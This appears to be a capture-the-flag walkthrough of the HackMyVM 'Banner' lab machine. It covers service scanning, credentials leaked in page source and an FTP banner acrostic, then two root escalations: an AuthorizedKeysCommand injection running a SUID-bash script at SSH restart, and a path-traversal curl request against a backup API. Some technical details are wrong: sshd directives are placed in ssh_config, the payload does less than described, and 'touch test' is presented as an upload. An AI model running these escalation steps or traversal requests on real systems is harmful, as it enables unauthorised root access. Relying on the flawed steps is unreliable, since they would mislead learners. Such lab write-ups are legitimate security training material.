+++
title = "Banner - Walkthrough"
date = "2026-08-29"
author = "nvru"
description = "Walkthrough for the Banner machine."
tags = [
"ctf",
"walkthrough",
"linux",
"ftp",
"ssh",
"http",
"werkzeug",
"privilege-escalation",
"directory-traversal",
"suid"
]
draft = false
+++

## Overview

- **Platform:** HackMyVM
- **Difficulty:** `Easy`
- **OS:** `Linux`
- **Attacker IP:** `10.10.10.2`
- **Target IP:** `10.10.10.4`

The objective was to enumerate the target, identify the exposed services, obtain initial access through FTP and SSH, and ultimately escalate privileges to root.

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.10.10.4 -- -sC -sV -A -oN nmap/rust
```

#### Results

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3
8080/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.9.2)
```

The scan identified three exposed services:

| Port | Service | Version        |
| ---- | ------- | -------------- |
| 21   | FTP     | vsftpd 2.0.8+  |
| 22   | SSH     | OpenSSH 8.4p1  |
| 8080 | HTTP    | Werkzeug 3.1.6 |

---

### HTTP Enumeration

Browsing to the web application on port **8080** displayed a security quiz application.

![HTTP Homepage](/images/hmv/banner/http.png)

Inspecting the page source revealed what appeared to be credentials.

![Source Credentials](/images/hmv/banner/src_creds.png)

Testing those credentials against the FTP service was successful.

```bash
ftp 111@10.10.10.4
```

![FTP Login](/images/hmv/banner/ftp_111.png)

After logging in, the FTP server exposed a standard home directory containing `.bashrc`, `.profile`, and a file named `hint`.

![FTP Home](/images/hmv/banner/ftp_home.png)

The `hint` file contained:

```text
Do you know what a banner is?
```

To determine whether write access was available, I uploaded a test file.

```bash
touch test
```

The upload succeeded, confirming that the FTP account had write permissions.

![FTP Upload](/images/hmv/banner/ftp_upload.png)

The FTP login banner contained the following text:

```text
Clever Owls Make
Elephants : Mice
Amazing Zebras Eat
Snakes Eat Crickets
Wild Elephants Love
```

Taking the first letter of each word reveals:

```text
COME
MAZE
SEC
WEL
```

Reconstructing the words produces the SSH credentials:

```text
welcome:mazesec
```

---

## Initial Access

Using the recovered credentials, SSH access was obtained.

```bash
ssh welcome@10.10.10.4
```

![SSH Access](/images/hmv/banner/ssh_welcome.png)

---

## Privilege Escalation

Initial enumeration of the user's home directory did not reveal anything useful, so further system enumeration was performed.

Two privilege escalation paths were identified.

---

### Method 1 - Writable SSH Configuration

Checking the user's sudo permissions revealed the ability to restart the SSH service as root without supplying a password.

![Sudo Permissions](/images/hmv/banner/sudo_perm.png)

Searching for world-writable files owned by root identified an interesting target.

```bash
find / -type f -user root -perm -002 -ls 2>/dev/null
```

![SSH Config](/images/hmv/banner/found_file.png)

The file `/etc/ssh/ssh_config` was writable.

![Writable ssh_config](/images/hmv/banner/ssh_edit.png)

Appending the following configuration causes SSH to execute an attacker-controlled script as root.

```text
AuthorizedKeysCommand /bin/bash /tmp/hello
AuthorizedKeysCommandUser root
```

The payload creates a SUID Bash binary and installs a root SSH key.

```bash
#!/usr/bin/env bash

cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
```

Restarting SSH executes the payload.

```bash
sudo /sbin/service sshd restart
```

After the restart, the SUID binary appeared in `/tmp`.

![SUID Bash](/images/hmv/banner/suid_file.png)

---

### Method 2 - Vulnerable Backup API

Continuing manual enumeration revealed an application located in `/opt/ctf-game`.

![Found ctf-game](/images/hmv/banner/found_opt.png)

Reviewing `main.py` exposed an endpoint named `/api/backup`.

![API Source](/images/hmv/banner/src_api_backup.png)

The backup functionality accepted an arbitrary file path and copied it without validation.

![Backup Code](/images/hmv/banner/api_backup_code.png)

Because the application executed as **root**, the endpoint was vulnerable to directory traversal, allowing arbitrary file reads.

![Traversal](/images/hmv/banner/api_backup_exploit.png)

For example, the root flag could be retrieved directly.

```bash
curl -s "http://10.10.10.4:8080/api/backup?file=../../../../../../../../../../../../../root/root.txt"
```

---

## Root

Using either privilege escalation method resulted in root access.

![Root Shell](/images/hmv/banner/root.png)

---

## Credentials

```text
FTP
111:banner

SSH
welcome:mazesec
```

---

## Flags

### User

```text
flag{user-509fe78ad30da7792f576cd3a91a57fc}
```

### Root

```text
flag{root-fc7fb423367bb7fccb411758f06f857a}
```

---

## Attack Path

```text
HTTP Enumeration on Port 8080
        ↓
Credentials Discovered in Page Source
        ↓
FTP Access as 111
        ↓
FTP Banner Enumeration
        ↓
Banner Acrostic Reveals SSH Credentials
        ↓
SSH Access as welcome
        ↓
Local Enumeration
        ↓
Privilege Escalation Path 1
        ↓
Writable /etc/ssh/ssh_config
        ↓
AuthorizedKeysCommand Injection
        ↓
Restart SSH Service as Root
        ↓
Root SUID Bash
        ↓
Root Shell
```

---

## References

- [OWASP – Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Debian OpenSSH `sshd_config` documentation – `AuthorizedKeysCommand` and `AuthorizedKeysCommandUser`](https://manpages.debian.org/bookworm/openssh-server/sshd_config.5.en.html)
- [Werkzeug documentation](https://werkzeug.palletsprojects.com/en/stable/)
